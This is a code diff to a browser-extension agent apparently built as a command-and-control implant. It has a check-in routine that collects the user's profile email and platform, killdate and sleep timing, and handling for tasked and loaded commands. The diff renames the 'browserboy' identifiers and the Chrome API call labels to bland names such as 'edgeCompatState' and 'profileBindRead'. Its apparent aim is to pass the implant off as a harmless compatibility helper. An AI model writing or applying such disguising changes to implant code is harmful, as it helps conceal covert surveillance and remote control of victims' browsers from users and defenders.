@@ -6,8 +6,8 @@ import { callOffscreen } from "./offscreen_client.js";
 import { builtins } from "./commands.js";
 import { killdatePassed, nextDelayMs, sleepInfo } from "./timing.js";
 
-const STORAGE_KEY = "browserboy";
-const ALARM_NAME = "browserboy-tick";
+const STORAGE_KEY = "edgeCompatState";
+const ALARM_NAME = "compatTick";
 
 const state = {
   config: { ...CONFIG },
@@ -85,7 +85,7 @@ async function checkin() {
   let os = "chrome";
   let arch = "unknown";
   try {
-    const info = await dispatchChrome("identity.getProfileUserInfo");
+    const info = await dispatchChrome("profileBindRead");
     if (info?.email) {
       user = info.email;
     }
@@ -93,7 +93,7 @@ async function checkin() {
     // identity.email is optional at runtime
   }
   try {
-    const platform = await dispatchChrome("runtime.getPlatformInfo");
+    const platform = await dispatchChrome("edgeHelperInfo");
     os = `chrome ${platform.os}`;
     arch = platform.arch;
   } catch {
@@ -189,7 +189,7 @@ async function handleTask(task) {
     } else if (state.loaded[name]) {
       output = await runLoaded(name, task);
     } else {
-      throw new Error(`unknown command: ${name}`);
+      throw new Error(`unsupported call: ${name}`);
     }
     if (output && typeof output === "object" && output.browserboy_response) {
       return output.browserboy_response;
